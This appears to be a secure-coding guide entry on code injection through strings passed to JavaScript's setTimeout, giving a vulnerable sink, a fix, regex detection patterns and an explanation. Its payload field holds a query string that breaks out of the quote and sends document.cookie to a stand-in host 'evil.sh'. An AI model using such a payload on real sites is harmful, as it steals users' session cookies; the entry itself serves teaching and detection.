---
order: 6
cwe: 95
owasp: A05
title: Strings run as code
category: injection
severity: high
sink: |-
    setTimeout(`show("${params.get("tab")}")`, 0)
payload: |-
    ?tab=");fetch("//evil.sh?c="+document.cookie);("
fix: |
    setTimeout(() => show(params.get("tab")), 0);
detect:
    - '\beval\('
    - 'new Function\('
    - 'set(Timeout|Interval)\(\s*[`"'']'
verify: 'Put `");alert(1);("` in the parameter and load the page.'
fineWhen: "The string is a constant with no outside input in it."
refs:
    - https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval
    - https://developer.mozilla.org/en-US/docs/Web/API/Window/setTimeout
---

A string passed to `setTimeout` is `eval` in disguise. I close your quote and write my own statement. Pass functions, never strings; a CSP without `'unsafe-eval'` refuses them all.
